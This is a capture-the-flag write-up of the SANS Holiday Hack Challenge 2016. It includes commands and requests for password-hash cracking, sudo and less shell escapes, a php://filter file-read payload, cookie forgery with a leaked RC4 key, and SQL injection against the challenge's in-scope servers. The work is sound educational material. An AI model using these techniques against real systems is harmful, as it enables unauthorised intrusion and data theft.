---
layout:     post
title:      Holiday Hack Challenge 2016 writeup
subtitle:   "Who abducted Santa?"
date:       2017-01-03 00:00:00
author:     "Martin Ingesen"
header-img: "img/post-bg-hhc16.jpg"
permalink:  "writeups/holiday-hack-challenge-2016-writeup/"
---

### Preface

Another christmas, another holiday hack challenge! Last year was a blast, so I can't wait to start this one! I won't be covering anything in game, but only the tasks as written on the holiday hack challenge website. I did however manage to get all achievements, but I won't cover that here.

### Part 1: A Most Curious Business Card

We are given two social media accounts.
- [https://twitter.com/santawclaus](https://twitter.com/santawclaus)
- [https://www.instagram.com/santawclaus/](https://www.instagram.com/santawclaus/)


#### 1) What is the secret message in Santa's tweets?

 The twitter feed seems to be filled with random stuff.
We copy the innerHTML of the twitter stream in the Chrome Developer console. Save the result to a file, and grep through the file for “tweet-text”.

```cat file | grep "tweet-text\""```

If we zoom out the terminal, we see the following:

![bugbounty](/img/hhc16/bugbounty.png)

the word ```bugbounty```.

#### 2) What is inside the ZIP file distributed by Santa's team?

There is an interesting image in the instagram image:

![bugbounty](/img/hhc16/instagram.jpg)

From the Instagram photo we see a zip file called SantaGram_v4.2.zip. We also see an nmap scan for the domain [northpolewonderland.com](http://northpolewonderland.com). We quickly discover that the zip file is accessible from the root directory of that website.

[http://northpolewonderland.com/SantaGram_v4.2.zip](http://northpolewonderland.com/SantaGram_v4.2.zip)

When downloaded, we discover that the file is password-protected. Through some trail and error, we discover that first task is linked to this one, meaning that the password was ```bugbounty```. Inside we find an Android APK.

### Part 2: Awesome Package Konveyance

#### 3) What username and password are embedded in the APK file?

Using jadx, we decompile the APK, and simply search for the string "password". In the files ```apk-dir/com/northpolewonderland/santagram/C0987b.java``` and ```apk-dir/com/northpolewonderland/santagram/SplashScreen.java``` we find

    jSONObject.put("username", "guest");
    jSONObject.put("password", "busyreindeer78");

#### 4) What is the name of the audible component (audio file) in the SantaGram APK file?

In ```res/raw/``` we find the mp3 file in question, called ```discombobulatedaudio1.mp3```.

### Part 3: A Fresh-Baked Holiday Pi

#### 5) What is the password for the "cranpi" account on the Cranberry Pi system?

From one of the elfs in the game, we receive the url:
[https://www.northpolewonderland.com/cranbian.img.zip](https://www.northpolewonderland.com/cranbian.img.zip)

By mounting the image, we see that it’s a linux file system.
the ```/etc/shadow```-file from the image contain the following line:

    cranpi:$6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0:17140:0:99999:7:::

Combining this with ```/etc/passwd``` using ```/usr/bin/unshadow``` gives us:

    cranpi:$6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0:1000:1000:,,,:/home/cranpi:/bin/bash

Using John and the RockYou wordlist, we get:

    cranpi:yummycookies:1000:1000:,,,:/home/cranpi:/bin/bash


#### 6) How did you open each terminal door and where had the villain imprisoned Santa?

**Elf house #2**:

By using ```sudo -l``` we get to know the user scratchy can run both strings and tcpdump as itchy without a password.
First, we use strings as such: ```sudo -u itchy strings /out.pcap```, yielding:

    <input type="hidden" name="part1" value="santasli" />

Which mean ```santasli``` is the first part of the passphrase. I messed around with extracting the binary blob for a while, but randomly tried ```santaslittlehelper``` as the password for the door. And magically it worked!

**Stables**:

By using base64, we extract the wumpus executable. Using GDB I called the kill_wumpus function which gave me the password:
```WUMPUS IS MISUNDERSTOOD```

**Train Station**:

When we write HELP, we are dropped into less. Less works a bit like Vim, meaning that we can write :! And execute a command. So we simply do ```:!ls``` and list the directory. There we find the ActivateTrain binary, and run that using ```:!./ActivateTrain```

**Workshop Door to second floor**:

    To open the door, find the passphrase file deep in the directories.

Aha, lets dig out some linux-fu:

    > find . -name "*.txt"
    ./.doormat/. / /\/\\/Don't Look Here!/You are persistent, aren't you?/'/key_for_the_door.txt

Okay, so we simply escape all the spaces etc with \\.

    cat .doormat/\.\ /\ /\\/\\\\/Don\'t\ Look\ Here\!/You\ are\ persistent\,\ aren\'t\ you?/\'/key_for_the_door.txt

and we get the flag: ```open_sesame```.

**Santa's Office**

Here we get to relive many hackers childhood! Wargames!

    GREETINGS PROFESSOR FALKEN.

    Hello.

    HOW ARE YOU FEELING TODAY?

    I'm fine. How are you?

    EXCELLENT, IT'S BEEN A LONG TIME. CAN YOU EXPLAIN THE REMOVAL OF YOUR USER ACCOUNT ON 6/
    23/73?

    People sometimes make mistakes.

    YES THEY DO. SHALL WE PLAY A GAME?

    Love to. How about Global Thermonuclear War?

    WOULDN'T YOU PREFER A GOOD GAME OF CHESS?

    Later. Let's play Global Thermonuclear War.

    FINE

    ,------~~v,_         _                     _--^\
     |'          \   ,__/ ||                 _/    /,_ _
    /             \,/     /         ,,  _,,/^         v v-___
    |                    /          |'~^                     \
    \                   |         _/                     _ _/^
     \                 /         /                   ,~~^/ |
      ^~~_       _ _   /          |          __,, _v__\   \/
          '~~,  , ~ \ \           ^~       /    ~   //
              \/     \/             \~,  ,/          
                                       ~~
       UNITED STATES                   SOVIET UNION
    WHICH SIDE DO YOU WANT?
         1.    UNITED STATES
         2.    SOVIET UNION

    PLEASE CHOOSE ONE:
    2

    AWAITING FIRST STRIKE COMMAND
    -----------------------------
    PLEASE LIST PRIMARY TARGETS BY
    CITY AND/OR COUNTRY NAME:

    Las Vegas

    LAUNCH INITIATED, HERE'S THE KEY FOR YOUR TROUBLE:
    LOOK AT THE PRETTY LIGHTS
    Press Enter To Continue

Which gives us the key ```LOOK AT THE PRETTY LIGHTS```.

### Part 4: My Gosh... It's Full of Holes

#### 7) ONCE YOU GET APPROVAL OF GIVEN IN-SCOPE TARGET IP ADDRESSES FROM TOM HESSMAN AT THE NORTH POLE, ATTEMPT TO REMOTELY EXPLOIT EACH OF THE FOLLOWING TARGETS:

<!-- For each of those six items, which vulnerabilities did you discover and exploit? -->

**The Mobile Analytics Server (via credentialed login access)**

Simple, log in with the credentials found in the APK. In the web interface there is a "MP3" link in the navigation bar. Simply click it, and we get the audio!

discombobulatedaudio2.mp3

**The Dungeon Game**

http://dungeon.northpolewonderland.com/ 35.184.47.139 (IN SCOPE)

Earlier we got the dungeon binary from an elf in game. Using that, we can locally look at the game. The game is commonly called Zork, so we do some Googling, and it turns out there is a way to "cheat" in game using something called GDT. By enumerating all rooms using GDT, we find a room called "The North Pole". We go there (```gdt ah 80```) and talk to the elf we find there. He wants us to give him something before he gives us the hint. By trail and error I find that I can give him a torch, and he will give me the hint. Now I just need to do it on the live version.

Using nmap we see that port ```11111``` is open. Looks like the server is running a version of the Zork game we received earlier.
This obviously runs the game server which can be connected to by using netcat (```nc 35.184.47.139 11111```).
The solution is to first go to room 80 and take the torch before going to room 192 and giving the torch to the elf using GDT. Then we get the hint:

```send email to "peppermint@northpolewonderland.com" for that which you seek.```

After sending the email, peppermint replies with the mp3-file.

```discombobulatedaudio3.mp3```

**The Debug Server**

http://dev.northpolewonderland.com/index.php 35.184.63.245 (IN SCOPE)

I found the dev server, but couldn't figure out how to interface with it. So I figured I had to enable debugging in the APK. Using Apktool we do this:

    $ apktool d SantaGram.apk
    $ vim res/values/strings.xml


Set false to true in the XML. Then rebuild the apk.

    $ apktool b -f ./SantaGram_4.2 -o lol

We now need to sign the apk again, before we deploy it:

	$ mkdir keys
	$ keytool -genkey -v -keystore keys/lol.keystore -alias lol -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 10000

	$ jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore keys/lol.keystore ./lol.apk lol

Drag and drop  on genymotion, install. Browse around with proxying through burp. Suddenly a wild dev.* appears.

    POST /index.php HTTP/1.1
    Content-Type: application/json
    User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0; Google Nexus 4 - 5.0.0 - API 21 - 768x1280_1 Build/LRX21M)
    Host: dev.northpolewonderland.com
    Connection: close
    Accept-Encoding: gzip
    Content-Length: 144

    {"date":"20161227224804-0500","udid":"8dce4456f734bf81","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":85719500}

With the reply:

    HTTP/1.1 200 OK
    Server: nginx/1.6.2
    Date: Wed, 28 Dec 2016 03:48:05 GMT
    Content-Type: application/json
    Connection: close
    Content-Length: 250

    {"date":"20161228034805","status":"OK","filename":"debug-20161228034805-0.txt","request":{"date":"20161227224804-0500","udid":"8dce4456f734bf81","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":85719500,"verbose":false}}


We set verbose to true in a new request, and receive this:

    HTTP/1.1 200 OK
    Server: nginx/1.6.2
    Date: Wed, 28 Dec 2016 03:51:32 GMT
    Content-Type: application/json
    Connection: close
    Content-Length: 719

    {"date":"20161228035132","date.len":14,"status":"OK","status.len":"2","filename":"debug-20161228035132-0.txt","filename.len":26,"request":{"date":"20161227224804-0500","udid":"8dce4456f734bf81","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":0,"verbose":true},"files":["debug-20161224235959-0.mp3","debug-20161228033632-0.txt","debug-20161228033648-0.txt","debug-20161228033732-0.txt","debug-20161228033753-0.txt","debug-20161228033818-0.txt","debug-20161228034635-0.txt","debug-20161228034805-0.txt","debug-20161228034916-0.txt","debug-20161228035048-0.txt","debug-20161228035050-0.txt","debug-20161228035052-0.txt","debug-20161228035122-0.txt","debug-20161228035132-0.txt","index.php"]}
    
Here we find the .mp3 in the debug text: [http://dev.northpolewonderland.com/debug-20161224235959-0.mp3](http://dev.northpolewonderland.com/debug-20161224235959-0.mp3)

**The Banner Ad Server**

http://ads.northpolewonderland.com/affiliate/C9E380C8-2244-41E3-93A3-D6C6700156A5 104.198.221.240 (IN SCOPE)
 
On the ads.* domain, we figure out that the site uses Meteor! We use the Meteor TamperMonkey script and see that there is a collection called HomeQuotes. I simply accessed this using the ```HomeQuotes.find().fetch()``` in the JS-console. And in the last object we found the url!

[http://ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3](http://ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3)


**The Uncaught Exception Handler Server**

http://ex.northpolewonderland.com/exception.php 104.154.196.33 (IN SCOPE)

Here we see that we can read crash dumps from the app. Using this, and a custom php filter, we can read the source code for the exception.php site.
 
	POST /exception.php HTTP/1.1
	Host: ex.northpolewonderland.com
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Content-Type: application/json
	Connection: close
	Upgrade-Insecure-Requests: 1
	Content-Length: 124
	 
	{
 	       	'operation': "ReadCrashDump",
        	'data': {
                    	'crashdump': "php://filter/convert.base64-encode/resource=exception"
        	}
	}
	
With the reply:
 
	<?php
	 
	# Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3
 
	# Code from http://thisinterestsme.com/receiving-json-post-data-via-php/
	# Make sure that it is a POST request.
	if(strcasecmp($_SERVER['REQUEST_METHOD'], 'POST') != 0){
	   die("Request method must be POST\n");
	}

[http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3](http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3)

**The Mobile Analytics Server (post authentication)**

https://analytics.northpolewonderland.com/report.php?type=launch 104.198.252.157 (IN SCOPE)

Using ```nmap -sC``` we find [https://analytics.northpolewonderland.com/.git/](https://analytics.northpolewonderland.com/.git/). We download it using ```wget -r --no-parent url 104.198.252.157```

Then the deleted files can be restored using: ```git checkout -- .```.

We see that we might want to access edit.php which is only accessible for administrators. We need to create a valid cookie for us to use. We have the source code, so we know how to do that:

	<?php
	  
		define('KEY', "\x61\x17\xa4\x95\xbf\x3d\xd7\xcd\x2e\x0d\x8b\xcb\x9f\x79\xe1\xdc");
	
		function decrypt($data) {
		  return mcrypt_decrypt(MCRYPT_ARCFOUR, KEY, $data, 'stream');
		}
		function encrypt($data) {
		    return mcrypt_encrypt(MCRYPT_ARCFOUR, KEY, $data, 'stream');
		}
		
		$cookie = "82532b2136348aaa1fa7dd2243da1cc9fb13037c49259e5ed70768d4e9baa1c80b97fee8bca82880fc78ba78c49e0753b14348637bec";
		$shit = json_decode(decrypt(pack("H*",$cookie)), true);
		var_dump($shit);
		$shit['username'] = "administrator";
		var_dump($shit);
		$newthing = bin2hex(encrypt(json_encode($shit)));
		print $newthing;
	?>

Then we use that cookie for access to the edit page.

We see that we can update a report, but not set the query, because it’s not in the html. Therefore we intercept the request, add the query parameter with the value equal to:

	SELECT * FROM `audio`;

We the access the report via the view.php script, and we find both of the audio files listed:

| id                                   | username      | filename                  | mp3 |
|--------------------------------------|---------------|---------------------------|-----|
| 20c216bc-b8b1-11e6-89e1-42010af00008 | guest         | discombobulatedaudio2.mp3 |     |
| 3746d987-b8b1-11e6-89e1-42010af00008 | administrator | discombobulatedaudio7.mp3 |     |

First I tried downloading the file via the getaudio.php page, but this only allowed for guest to download the file.
Okay, but we can edit the SQL for a report, and the values are displayed with htmlentities. This is why we don't see the mp3 content in the above table. But say hello to base64:

	SELECT username, TO_BASE64(mp3) FROM `audio`;
	
Then copy the base64 representation, decode it and save it as mp3.

```discombobulatedaudio7.mp3```

#### 8) What are the names of the audio files you discovered from each system above? There are a total of SEVEN audio files (one from the original APK in Question 4, plus one for each of the six items in the bullet list above.)

- discombobulatedaudio1.mp3
- discombobulatedaudio2.mp3
- discombobulatedaudio3.mp3
- debug-20161224235959-0.mp3
- discombobulatedaudio5.mp3
- discombobulated-audio-6-XyzE3N9YqKNH.mp3
- discombobulatedaudio7.mp3

### Part 5: Discombobulated Audio

#### 9) Who is the villain behind the nefarious plot.

We put all the files into Audacity, chain them together based on their number, and start tweaking. We adjust the speed, tempo and pitch untill we hear the voice: ```Father Christmas, Santa Claus. Or, as I've always known him, Jeff.```. Wait a second... that sounds like... [DOCTOR WHO](http://www.imdb.com/title/tt1672218/quotes?item=qt1395415)! Meaning that **Who** abducted Santa, literally!

#### 10) Why had the villain abducted Santa?

Using the above mentioned phrase, we get access to the last room in the game. We climb a ladder, and there we find him, Dr. Who himself!

He explains that he wanted to stop the Star Wars Holiday Special from being released. And abducting santa and using his North Pole Wonderland Magick could prevent it from ever being released.

## Epilogue

Another great Holiday Hack Challenge! A big thanks to the team behind Holiday Hack Challenge for creating such an enjoyable and memorable CTF for the christmas holiday! Thank you very much!
